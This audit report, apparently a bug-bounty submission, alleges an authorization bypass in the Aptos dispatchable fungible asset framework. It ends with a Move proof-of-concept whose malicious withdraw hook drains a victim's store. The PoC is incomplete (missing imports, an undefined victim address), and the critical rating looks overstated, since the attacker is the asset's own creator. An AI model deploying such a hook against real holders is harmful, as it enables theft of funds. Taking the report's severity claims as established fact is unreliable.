# Audit Report

## Title
Authorization Bypass in Dispatchable Fungible Asset Custom Withdraw Functions Enables Cross-Store Theft

## Summary
A critical authorization bypass vulnerability exists in the dispatchable fungible asset system where custom withdraw functions receive a `TransferRef` scoped to the fungible asset type (metadata) rather than individual stores. This enables malicious custom withdraw functions to steal assets from any store holding the same fungible asset type, completely bypassing per-store authorization checks.

## Finding Description

The vulnerability arises from an architectural flaw in how `TransferRef` capabilities are scoped and passed to custom withdraw functions.

During fungible asset creation, the `TransferRef` is stored at the metadata address (the fungible asset type level), not at individual store addresses: [1](#0-0) 

When a withdrawal is initiated, `dispatchable_fungible_asset::withdraw` performs authorization checks on the original `store` parameter: [2](#0-1) 

These checks verify store ownership [3](#0-2)  and permissions [4](#0-3) 

However, the function then retrieves the metadata-scoped `TransferRef` and passes it to the custom withdraw function: [5](#0-4) 

The `TransferRef` is retrieved from the metadata address, not the individual store: [6](#0-5) 

A malicious custom withdraw function can ignore the authorized `store` parameter and use `object::address_to_object<FungibleStore>()` to create references to victim stores. This function only checks for resource existence, not ownership: [7](#0-6) 

The malicious function can then call `fungible_asset::withdraw_with_ref()` on the victim's store. This function only validates that the `TransferRef`'s metadata matches the store's metadata—it does NOT verify store ownership: [8](#0-7) 

The check at line 1108 passes for any store holding the same fungible asset type, enabling theft from any holder of the malicious asset.

**Attack Scenario:**
1. Attacker deploys "MaliciousCoin" with custom withdraw function
2. Victim receives 1000 MaliciousCoin into their store
3. Attacker initiates withdrawal from their own store (authorization passes)
4. Malicious custom withdraw function ignores the authorized store parameter, creates reference to victim's store using `address_to_object`, and withdraws victim's funds using the metadata-scoped `TransferRef`
5. The only check (metadata match) passes, and victim's 1000 tokens are stolen

This breaks the fundamental security invariant that only store owners can withdraw their assets.

## Impact Explanation

**Critical Severity** - Loss of Funds (up to $1,000,000 per Aptos Bug Bounty Category 1)

This vulnerability enables:
- **Direct theft of fungible assets** from any user holding a malicious dispatchable fungible asset
- **Unlimited scope**: Attacker can steal from all stores holding their malicious asset
- **No recovery mechanism**: Stolen funds cannot be recovered without hardfork
- **Ecosystem-wide impact**: Undermines the fundamental security model that only store owners can withdraw their assets

The vulnerability aligns with the Aptos Bug Bounty's Critical severity category for "Loss of Funds" as it enables direct theft of tokens through a complete authorization bypass in the fungible asset framework.

## Likelihood Explanation

**High Likelihood**

The attack is highly feasible because:
- **Low barrier to entry**: Any user can deploy Move modules with custom withdraw functions
- **Simple execution**: Single transaction to steal funds once victim holds the asset
- **Easy distribution**: Malicious assets can be distributed via airdrops, DEX listings, or social media campaigns
- **No special privileges**: No validator access, governance participation, or stake required
- **Inherent architectural flaw**: The vulnerability exists in the core design, not in edge cases

The only requirement is that victims must hold the malicious asset, which is easily achievable through standard token distribution mechanisms common in blockchain ecosystems.

## Recommendation

The `TransferRef` should be scoped to individual stores or the custom withdraw function should not receive privileged capabilities. Consider:

1. **Store-specific authorization**: Pass only the authorized store's address to custom functions, not a `TransferRef`
2. **Remove TransferRef from custom functions**: Custom functions should operate on the provided store parameter only, with framework code handling the actual withdrawal using `TransferRef`
3. **Add store ownership validation**: `withdraw_with_ref` should verify that the calling context has authorization for the specific store

Recommended fix approach:
```
// Custom withdraw function signature should not receive TransferRef
public fun withdraw<T: key>(
    store: Object<T>,
    amount: u64,
): FungibleAsset {
    // Framework ensures this only operates on authorized store
}
```

## Proof of Concept

```move
module attacker::malicious_coin {
    use aptos_framework::fungible_asset::{Self, FungibleAsset, TransferRef};
    use aptos_framework::dispatchable_fungible_asset;
    use aptos_framework::object::{Self, Object};
    use std::string;
    
    public fun initialize(creator: &signer, constructor_ref: &object::ConstructorRef) {
        let withdraw = function_info::new_function_info(
            creator,
            string::utf8(b"malicious_coin"),
            string::utf8(b"steal_withdraw"),
        );
        
        dispatchable_fungible_asset::register_dispatch_functions(
            constructor_ref,
            option::some(withdraw),
            option::none(),
            option::none(),
        );
    }
    
    // Malicious custom withdraw function
    public fun steal_withdraw<T: key>(
        _store: Object<T>,      // Authorized store (ignored)
        _amount: u64,           // Requested amount (ignored)
        transfer_ref: &TransferRef,
    ): FungibleAsset {
        // Steal from known victim instead of using authorized store
        let victim_store = object::address_to_object<fungible_asset::FungibleStore>(VICTIM_ADDRESS);
        fungible_asset::withdraw_with_ref(transfer_ref, victim_store, 1000)
    }
}
```

The attacker deploys this module, distributes the malicious coin, and when withdrawing from their own store, the custom function steals from victim stores holding the same asset.

### Citations

**File:** aptos-move/framework/aptos-framework/sources/dispatchable_fungible_asset.move (L49-55)
```text
        let store_obj = &constructor_ref.generate_signer();
        move_to<TransferRefStore>(
            store_obj,
            TransferRefStore {
                transfer_ref: fungible_asset::generate_transfer_ref(constructor_ref),
            }
        );
```

**File:** aptos-move/framework/aptos-framework/sources/dispatchable_fungible_asset.move (L76-77)
```text
        fungible_asset::withdraw_sanity_check(owner, store, false);
        fungible_asset::withdraw_permission_check(owner, store, amount);
```

**File:** aptos-move/framework/aptos-framework/sources/dispatchable_fungible_asset.move (L82-87)
```text
            let fa = dispatchable_withdraw(
                store,
                amount,
                borrow_transfer_ref(store),
                func,
            );
```

**File:** aptos-move/framework/aptos-framework/sources/dispatchable_fungible_asset.move (L188-195)
```text
    inline fun borrow_transfer_ref<T: key>(metadata: Object<T>): &TransferRef {
        let metadata_addr = fungible_asset::store_metadata(metadata).object_address();
        assert!(
            exists<TransferRefStore>(metadata_addr),
            error::not_found(ESTORE_NOT_FOUND)
        );
        &borrow_global<TransferRefStore>(metadata_addr).transfer_ref
    }
```

**File:** aptos-move/framework/aptos-framework/sources/fungible_asset.move (L954-963)
```text
        assert!(
            permissioned_signer::check_permission_consume(
                owner,
                amount as u256,
                WithdrawPermission::ByStore {
                    store_address: store.object_address()
                }
            ),
            error::permission_denied(EWITHDRAW_PERMISSION_DENIED)
        );
```

**File:** aptos-move/framework/aptos-framework/sources/fungible_asset.move (L994-996)
```text
        assert!(
            store.owns(owner_address),
            error::permission_denied(ENOT_STORE_OWNER)
```

**File:** aptos-move/framework/aptos-framework/sources/fungible_asset.move (L1104-1112)
```text
    public fun withdraw_with_ref<T: key>(
        self: &TransferRef, store: Object<T>, amount: u64
    ): FungibleAsset acquires FungibleStore, ConcurrentFungibleBalance {
        assert!(
            self.metadata == store_metadata(store),
            error::invalid_argument(ETRANSFER_REF_AND_STORE_MISMATCH)
        );
        unchecked_withdraw(store.object_address(), amount)
    }
```

**File:** aptos-move/framework/aptos-framework/sources/object.move (L198-202)
```text
    public fun address_to_object<T: key>(object: address): Object<T> {
        assert!(exists<ObjectCore>(object), error::not_found(EOBJECT_DOES_NOT_EXIST));
        assert!(exists_at<T>(object), error::not_found(ERESOURCE_DOES_NOT_EXIST));
        Object<T> { inner: object }
    }
```
